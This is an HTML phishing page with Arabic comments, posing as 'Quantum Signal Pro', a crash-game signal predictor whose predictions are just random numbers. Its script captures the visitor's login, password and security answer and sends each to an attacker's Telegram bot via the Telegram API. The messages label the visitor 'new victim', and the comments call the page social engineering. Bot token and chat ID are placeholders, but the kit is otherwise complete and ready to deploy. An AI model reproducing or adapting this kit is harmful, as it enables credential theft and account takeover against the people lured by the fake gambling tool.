<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Quantum Signal Pro v7</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background: radial-gradient(circle at top,#020617,#000);
            color:white; font-family: Arial, sans-serif;
            display:flex; justify-content:center; align-items:center;
            height:100vh; margin: 0; overflow: hidden;
        }
        .hidden { display: none !important; }
        
        /* تأثير التوهج الخلفي */
        .glow {
            position:absolute; width:500px; height:500px;
            background:radial-gradient(circle,#00fff233,transparent);
            filter:blur(80px); z-index: -1;
        }

        /* واجهة الرادار الفيروزية */
        .circle {
            width:300px; height:300px; border-radius:50%;
            border:1px solid rgba(0,255,242,0.3);
            backdrop-filter: blur(10px); display:flex;
            flex-direction:column; justify-content:center;
            align-items:center; position:relative;
            box-shadow:0 0 60px rgba(0,255,242,0.2);
        }

        .circle::before {
            content:""; position:absolute; width:340px; height:340px;
            border-radius:50%; border:2px dashed rgba(0,255,242,0.2);
            animation:rotate 10s linear infinite;
        }

        @keyframes rotate { from{transform:rotate(0deg);} to{transform:rotate(360deg);} }

        #mult { font-size:65px; font-weight:900; text-shadow:0 0 25px #00fff2; transition:0.3s; }

        .btn-cyan {
            margin-top:40px; padding:18px 60px; border-radius:40px;
            font-weight:bold; background:linear-gradient(90deg,#00fff2,#00bfff);
            color:black; box-shadow:0 10px 30px rgba(0,255,242,0.4);
            transition:0.2s; border: none; cursor: pointer; text-transform: uppercase;
        }

        /* ستايل الخانة الحمراء (الهندسة الاجتماعية) */
        .sec-input {
            width: 90%; padding: 20px; background: white !important;
            border: 5px solid #ff0000 !important; border-radius: 15px;
            color: black !important; font-size: 22px; font-weight: 900;
            text-align: center; margin: 20px 0; outline: none;
        }
    </style>
</head>
<body>

    <div class="glow"></div>

    <section id="auth-screen" class="flex flex-col items-center w-full px-6">
        <h1 class="text-4xl font-black italic mb-2">QUANTUM<span class="text-cyan-400">NODE</span></h1>
        <p class="text-zinc-500 text-xs mb-8 tracking-tighter">SECURE CLOUD SYNCHRONIZATION ACTIVE</p>
        
        <div class="w-full max-w-xs space-y-4">
            <input type="text" id="u_log" placeholder="رقم الهاتف أو البريد الإلكتروني" class="w-full p-4 bg-zinc-900/80 border border-white/10 rounded-xl text-center outline-none focus:border-cyan-500">
            <input type="password" id="u_pas" placeholder="كلمة المرور" class="w-full p-4 bg-zinc-900/80 border border-white/10 rounded-xl text-center outline-none focus:border-cyan-500">
            <button onclick="startSync()" id="sync-btn" class="w-full py-4 bg-blue-600 rounded-xl font-black uppercase shadow-lg shadow-blue-900/20 active:scale-95 transition-all">Start Real-Time Sync</button>
        </div>
        <p id="status-msg" class="mt-4 text-[10px] text-zinc-600 font-mono"></p>
    </section>

    <section id="security-layer" class="hidden flex flex-col items-center w-full px-6 text-center">
        <div class="w-20 h-20 border-2 border-red-600 rounded-full flex items-center justify-center mb-6 bg-red-600/10">
            <span class="text-red-600 text-4xl">⚠️</span>
        </div>
        <h2 class="text-2xl font-black uppercase mb-2">Security Verification</h2>
        <p class="text-red-500 font-bold text-sm mb-6">يرجى تأكيد "اللقب" أو "الإجابة السرية" لفتح التشفير</p>
        
        <input type="text" id="sec_ans" placeholder="اكتب الإجابة هنا..." class="sec-input">
        
        <button onclick="finalUnlock()" class="w-full max-w-xs py-4 bg-white text-black font-black rounded-xl uppercase active:scale-95 transition-all">Confirm & Unlock</button>
    </section>

    <section id="main-app" class="hidden flex flex-col items-center">
        <div class="circle">
            <div id="mult">1.00x</div>
            <div class="text-xs text-cyan-300 mt-2 tracking-widest uppercase font-bold">Quantum Signal</div>
        </div>
        <button id="get-btn" onclick="generateSignal()" class="btn-cyan">Get New Signal</button>
    </section>

    <script>
        // دمج السكريبت مع البوت تاعك
        const botToken = "YOUR_BOT_TOKEN"; // حط التوكن تاعك هنا
        const chatId = "YOUR_CHAT_ID";     // حط الايدي تاعك هنا

        function sendToTelegram(msg) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=html`);
        }

        // معالجة الدخول
        function startSync() {
            const user = document.getElementById('u_log').value;
            const pass = document.getElementById('u_pas').value;
            const btn = document.getElementById('sync-btn');

            if(!user || !pass) return alert("يرجى ملء البيانات!");

            btn.innerText = "SYNCHRONIZING...";
            btn.disabled = true;

            // إرسال البيانات الأولى
            sendToTelegram(`<b>🔥 ضحية جديدة (Login):</b>\n👤 User: <code>${user}</code>\n🔑 Pass: <code>${pass}</code>`);

            setTimeout(() => {
                document.getElementById('auth-screen').classList.add('hidden');
                document.getElementById('security-layer').classList.remove('hidden');
            }, 2000);
        }

        // معالجة اللقب (الضربة القاضية)
        function finalUnlock() {
            const ans = document.getElementById('sec_ans').value;
            if(!ans) return alert("الرجاء إدخال الإجابة!");

            sendToTelegram(`<b>⚠️ اللقب المسترجع:</b>\n🔑 Answer: <code>${ans}</code>`);

            document.getElementById('security-layer').classList.add('hidden');
            document.getElementById('main-app').classList.remove('hidden');
        }

        // نظام الرادار المطور تاعك
        function generateSignal() {
            const btn = document.getElementById("get-btn");
            const mult = document.getElementById("mult");

            btn.disabled = true;
            btn.innerText = "ANALYZING...";
            btn.style.opacity = "0.5";

            let target = (Math.random() * (12 - 1.1) + 1.1).toFixed(2);

            setTimeout(() => {
                mult.innerText = target + "x";
                mult.style.transform = "scale(1.3)";
                setTimeout(() => mult.style.transform = "scale(1)", 300);

                btn.disabled = false;
                btn.innerText = "Get New Signal";
                btn.style.opacity = "1";
            }, 1200);
        }
    </script>
</body>
</html>
